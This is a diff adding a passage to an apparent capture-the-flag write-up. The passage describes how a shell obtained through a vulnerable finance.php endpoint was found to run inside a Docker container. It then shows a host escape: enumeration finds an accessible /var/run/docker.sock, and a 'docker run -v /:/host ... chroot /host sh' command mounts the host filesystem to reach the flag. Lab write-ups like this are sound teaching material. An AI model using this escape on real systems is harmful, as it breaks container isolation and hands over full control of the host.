@@ -149,3 +149,65 @@ SSRF exploitation
 Reverse shells
 Linux enumeration
 Docker escape techniques
+
+
+
+
+###################################################################
+
+### Docker Escape Summary
+
+After gaining a reverse shell through the vulnerable `finance.php` endpoint, the shell was running inside a Docker container.
+
+To confirm the environment, basic enumeration commands were executed.
+
+First, the filesystem was inspected:
+
+ls -la /
+
+This revealed the presence of the `.dockerenv` file:
+
+.dockerenv
+
+The existence of this file indicates that the process is running inside a Docker container.
+
+Next, system directories were explored to identify potential escape vectors.
+
+ls -la /var/run
+
+This revealed the Docker socket:
+
+/var/run/docker.sock
+
+To confirm its permissions:
+
+ls -la /var/run/docker.sock
+
+Output:
+
+srw-rw---- 1 root docker 0 /var/run/docker.sock
+
+The Docker socket allows communication with the Docker daemon running on the host system.  
+If accessible, it can be abused to control Docker from inside the container.
+
+To verify that Docker commands were available, the following command was executed:
+
+docker ps
+
+This listed the running containers and revealed the available image:
+
+phpvulnerable
+
+Since the host had no internet access, a new container was created using the existing local image while mounting the host filesystem:
+
+docker run -i --rm -v /:/host phpvulnerable chroot /host sh
+
+Explanation:
+
+- `-v /:/host` mounts the host filesystem
+- `chroot /host` changes the root directory to the host
+- `phpvulnerable` uses a local Docker image already present on the system
+
+After executing this command, the container isolation was bypassed and full access to the host filesystem was obtained.
+
+The final flag was then located in the host system.
